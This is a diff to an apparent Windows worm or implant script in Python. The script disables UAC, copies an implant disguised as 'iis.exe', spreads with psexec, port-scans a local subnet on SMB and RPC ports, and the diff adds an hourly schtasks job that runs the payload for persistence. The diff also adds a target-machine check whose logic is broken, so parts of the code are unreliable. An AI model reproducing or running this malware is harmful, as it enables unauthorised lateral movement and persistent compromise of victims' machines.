@@ -12,12 +12,15 @@ import winreg
 import socket
 import subprocess
 import asyncio
+import queue
+import threading
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 import re
 from errno import ECONNREFUSED
 from functools import partial
 from multiprocessing import Pool
+
 
 
 
@@ -31,7 +34,7 @@ Then it uses the at command
 Then it goes ahead and leverages that at command within the system to launch the new file
 '''
 
-NUM_CORES = 4
+NUM_THREADS = 4
 ASADMIN = 'asadmin'
 pexecPath = 'C:\\temp\\psexec.exe'
 cmdshell = "cmd.exe"
@@ -42,10 +45,34 @@ remoteNet = "192.168.251."
 execName = 'mybatch.exe'
 implantName = 'iis.exe'
 
+
 host = ''
 max_port = 1024
 min_port = 1
-debug = 0
+debug = 1
+
+def CompTest(run):
+    run = 0
+
+    try:
+        for i in computers:
+            if debug == 1:
+                print ("Current test is " + i)
+            if i == os.environ['COMPUTERNAME']:
+                if i != computers:
+                    run = 0
+                elif i == computers:
+                    run = 1
+                else:
+                    pass
+
+        if debug == 1:
+            print("Run")
+        return run
+
+    except Exception as e:
+        print(e)
+
 
 def disable_UAC():
     try:
@@ -117,8 +144,6 @@ def scan_host(host, port, r_code = 1):
         pass
     return r_code
 
-    time.sleep(5)
-
 def implant_Copy():
     if debug ==1 :
         print("print Entering the Copy portion")
@@ -140,7 +165,6 @@ def implant_Copy():
             print("Error %s" % e.strerror)
     except:
         pass
-    time.sleep(5)
 
 def computer_Scheduler():
     if debug == 1:
@@ -153,11 +177,15 @@ def computer_Scheduler():
     except shutil.Error as e:
         pass
 
-    if os.path.isfile("C:\\windows\\system32\\psexec.exe"):
-        print("Great")
-    else:
-        filetoDownload = ''
-        download_File(filetoDownload)
+    try:
+        if os.path.isfile("C:\\windows\\system32\\psexec.exe"):
+            print("Great")
+        else:
+            filetoDownload = ''
+            download_File(filetoDownload)
+
+    except Exception as e:
+        pass
 
     if os.path.isfile("C:\\windows\\system32\\psexec.exe"):
         try:
@@ -166,15 +194,14 @@ def computer_Scheduler():
         except:
             pass
 
-    time.sleep(5)
+    try:
+        subprocess.Popen(r"net use Z: /d")
+        subprocess.Popen(r'schtasks /Create /SC HOURLY /MO 1 /TN MyBatch /TR "cmd /k START /B C:\\Windows\\System32\\mybatch.exe"')
 
-    subprocess.Popen(r"net use Z: /d")
-    subprocess.Popen(r"schtasks /Create /SC HOURLY /MO 1 /TN MyBatch /TR C:\Windows\System32\mybatch.exe")
-
-    time.sleep(5)
+    except Exception as e:
+        pass
 
 if __name__ == '__main__':
-    #run = 0
 
     try:
         print('''
@@ -207,26 +234,14 @@ if __name__ == '__main__':
         else:
             pass
 
-        for i in computers:
-            print ("Current test is " + i)
-            if i == os.environ['COMPUTERNAME']:
-                print ("Computer Name is " + i)
-                #run = 1
-                #if i == 'NOTAVICTIM7':
-                #    debug = 1
-                #else:
-                #    debug = 0
+        run = ''
 
-            else:
-                pass
-
-
-        #print(run)
-
-        #if run == 0:
-        #    sys.exit(1)
+        CompTest(run)
+        if run == 0:
+            sys.exit(1)
 
         hosts = []
+        port = 0
 
         for ip in range(7,15):
             netRange = '192.168.31.'
@@ -235,7 +250,8 @@ if __name__ == '__main__':
 
         for host in hosts:
             scan_ports = [80,135,443,445,137]
-            print ("[***] Starting a Portscan on host %s:\n" % host )
+            if debug == 1:
+                 print ("[***] Starting a Portscan on host %s:\n" % host )
             for port in scan_ports:
                 response = scan_host(host, port)
 
